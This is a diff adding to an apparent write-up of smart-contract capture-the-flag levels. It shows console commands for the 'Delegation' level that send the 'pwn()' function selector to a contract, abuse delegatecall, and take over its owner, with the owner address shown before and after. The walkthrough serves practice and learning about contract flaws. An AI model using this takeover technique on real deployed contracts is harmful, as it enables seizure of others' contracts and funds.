@@ -98,3 +98,17 @@ contract TelephoneHack {
 
 > await contract.balanceOf(player)
 < overflow
+```
+
+## 6.Delegation
+```
+> await.contract.owner()
+< '0x9451961b7Aea1Df57bc20CC68D72f662241b5493'
+
+> var pwnSignature = web3.utils.sha3("pwn()")
+> pwnSignature
+< '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
+> contract.sendTransaction({data:pwnSignature})
+
+> await.contract.owner()
+< '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
